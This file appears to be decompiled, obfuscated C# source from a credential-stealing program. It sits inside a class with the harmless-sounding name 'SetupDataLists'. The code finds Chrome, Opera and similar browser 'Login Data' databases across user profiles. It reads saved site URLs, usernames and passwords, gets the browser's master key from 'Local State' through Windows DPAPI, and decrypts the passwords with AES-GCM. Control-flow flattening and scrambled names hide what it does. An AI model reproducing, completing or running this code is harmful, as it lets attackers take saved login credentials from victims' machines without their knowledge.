using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using C6Zy;
using rCOGWW;
using reJu9lk2r;

namespace UCgTB4iR
{
	// Token: 0x0200004C RID: 76
	internal sealed class SetupDataLists
	{
		// Token: 0x06000158 RID: 344 RVA: 0x0001C1F8 File Offset: 0x0001A3F8
		internal static List<WTitxI2m> 8PquFLl3p(string HrmkPjLhMLY, string k2hPTzf, string y9H4XKK6 = "logins")
		{
			int num = 0;
			List<WTitxI2m> list2;
			for (;;)
			{
				if (num != 7)
				{
					goto IL_36;
				}
				string text;
				if (File.Exists(text))
				{
					num = 8;
					goto IL_36;
				}
				goto IL_37B;
				IL_C2:
				List<string> list;
				if (num == 1)
				{
					list = SetupDataLists.tLxnth5fVt(HrmkPjLhMLY);
					num = 2;
				}
				string[] array;
				if (num == 3)
				{
					array = list.ToArray();
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num != 8)
				{
					continue;
				}
				btrVogW btrVogW;
				try
				{
					btrVogW = new btrVogW(text);
				}
				catch
				{
					goto IL_37B;
				}
				if (btrVogW.f9NLCu(y9H4XKK6))
				{
					string text2 = string.Empty;
					string text3 = string.Empty;
					string text4 = string.Empty;
					for (int i = 0; i <= btrVogW.unm() - 1; i++)
					{
						try
						{
							text2 = btrVogW.jK2IxJ35o1(i, "origin_url");
							text3 = btrVogW.jK2IxJ35o1(i, "username_value");
							text4 = btrVogW.jK2IxJ35o1(i, "password_value");
							if (text4.StartsWith("v10") | text4.StartsWith("v11"))
							{
								byte[] iij = new byte[0];
								if (text.Contains("Opera Stable") & Directory.Exists(Directory.GetParent(text).FullName))
								{
									iij = SetupDataLists.6ZBV(Directory.GetParent(text).FullName);
								}
								else
								{
									iij = SetupDataLists.6ZBV(Directory.GetParent(text).Parent.FullName);
								}
								text4 = SetupDataLists.VYX(Encoding.Default.GetBytes(btrVogW.jK2IxJ35o1(i, "password_value")), iij);
							}
							else
							{
								text4 = SetupDataLists.NFZOVQvXL(btrVogW.jK2IxJ35o1(i, "password_value"));
							}
							if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && text4 != null)
							{
								list2.Add(new WTitxI2m
								{
									data1 = text2,
									data2 = text3,
									data3 = text4,
									data4 = k2hPTzf
								});
							}
						}
						catch
						{
						}
					}
					goto IL_37B;
				}
				goto IL_37B;
				IL_36:
				if (num == 2)
				{
					list2 = new List<WTitxI2m>();
					num = 3;
				}
				if (num == 5)
				{
					goto IL_389;
				}
				int num2;
				if (num == 4)
				{
					num2 = 0;
					num = 5;
				}
				if (num != 6)
				{
					goto IL_C2;
				}
				IL_AC:
				text = array[num2];
				num = 7;
				goto IL_C2;
				IL_389:
				if (num2 >= array.Length)
				{
					break;
				}
				goto IL_AC;
				IL_37B:
				num2++;
				goto IL_389;
			}
			return list2;
		}

		// Token: 0x06000159 RID: 345 RVA: 0x0001C5D8 File Offset: 0x0001A7D8
		public static byte[] 6ZBV(string 7u607wY)
		{
			int num = 0;
			byte[] array;
			string path;
			for (;;)
			{
				if (num == 2)
				{
					array = new byte[0];
					num = 3;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 1)
				{
					path = 7u607wY + "\\Local State";
					num = 2;
				}
				if (num == 3)
				{
					if (File.Exists(path))
					{
						goto IL_BC;
					}
					num = 4;
				}
				if (num == 5)
				{
					goto IL_BC;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					byte[] result;
					return result;
				}
			}
			return null;
			IL_BC:
			MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
			foreach (object obj in matchCollection)
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					try
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
					catch
					{
						return null;
					}
				}
			}
			if (array != null & array.Length > 5)
			{
				byte[] array2 = new byte[array.Length - 6 + 1];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					return GHbU7Rc.Izg99u(array2, DataProtectionScope.CurrentUser);
				}
				catch
				{
					return null;
				}
			}
			return null;
		}

		// Token: 0x0600015A RID: 346 RVA: 0x0001C84C File Offset: 0x0001AA4C
		public static string VYX(byte[] pyNz2wY, byte[] IIj)
		{
			int num = 0;
			byte[] array;
			do
			{
				if (num == 2)
				{
					byte[] array2;
					array = array2;
					num = 3;
				}
				if (num == 3)
				{
					Array.Copy(pyNz2wY, 3, array, 0, 12);
					num = 4;
				}
				if (num == 1)
				{
					byte[] array2 = new byte[12];
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 4);
			string result;
			try
			{
				byte[] array3 = new byte[pyNz2wY.Length - 15];
				Array.Copy(pyNz2wY, 15, array3, 0, pyNz2wY.Length - 15);
				ouv3Oi ouv3Oi = new ouv3Oi();
				byte[] array4 = new byte[16];
				byte[] array5 = new byte[array3.Length - array4.Length];
				Array.Copy(array3, array3.Length - 16, array4, 0, 16);
				Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
				string @string = Encoding.UTF8.GetString(ouv3Oi.O0xgxU(IIj, array, null, array5, array4));
				result = @string;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600015B RID: 347 RVA: 0x0001CA20 File Offset: 0x0001AC20
		public static string NFZOVQvXL(string 4xSd)
		{
			int num = 0;
			for (;;)
			{
				if (num == 2)
				{
					if (4xSd.Length != 0)
					{
						goto IL_AB;
					}
					num = 3;
				}
				if (num == 3)
				{
					break;
				}
				if (num == 1)
				{
					if (4xSd == null)
					{
						break;
					}
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 4)
				{
					goto Block_6;
				}
			}
			return null;
			Block_6:
			string result;
			try
			{
				IL_AB:
				result = GHbU7Rc.ZDzD1h(Encoding.Default.GetBytes(4xSd), DataProtectionScope.CurrentUser);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600015C RID: 348 RVA: 0x0001CB18 File Offset: 0x0001AD18
		public static List<string> tLxnth5fVt(string EnnPTy)
		{
			int num = 0;
			for (;;)
			{
				List<string> list;
				if (num == 1)
				{
					list = new List<string>();
					num = 2;
				}
				int num2;
				if (num == 7)
				{
					num2 = 0;
					num = 8;
				}
				List<string> list2;
				if (num == 4)
				{
					list2 = list;
					num = 5;
				}
				if (num == 13)
				{
					goto IL_87;
				}
				goto IL_9F;
				IL_181:
				if (num == 15)
				{
					break;
				}
				if (num == 14)
				{
					return list2;
				}
				if (num == 12)
				{
					goto IL_1D1;
				}
				IL_1E8:
				if (num == 2)
				{
					list.Add(EnnPTy + "\\Default\\Login Data");
					num = 3;
				}
				if (num == 8)
				{
					goto IL_87;
				}
				string text;
				if (num == 10)
				{
					if (!text.Contains("Profile"))
					{
						goto IL_1D1;
					}
					num = 11;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 16)
				{
					return list2;
				}
				continue;
				IL_1D1:
				num2++;
				num = 13;
				goto IL_1E8;
				IL_9F:
				string[] directories;
				if (num == 6)
				{
					directories = Directory.GetDirectories(EnnPTy);
					num = 7;
				}
				if (num == 5)
				{
					if (!Directory.Exists(EnnPTy))
					{
						break;
					}
					num = 6;
				}
				if (num == 3)
				{
					list.Add(EnnPTy + "\\Login Data");
					num = 4;
				}
				if (num == 11)
				{
					list2.Add(text + "\\Login Data");
					num = 12;
				}
				if (num != 9)
				{
					goto IL_181;
				}
				IL_16B:
				text = directories[num2];
				num = 10;
				goto IL_181;
				IL_87:
				if (num2 >= directories.Length)
				{
					num = 14;
					goto IL_9F;
				}
				goto IL_16B;
			}
			return new List<string>();
		}
	}
}
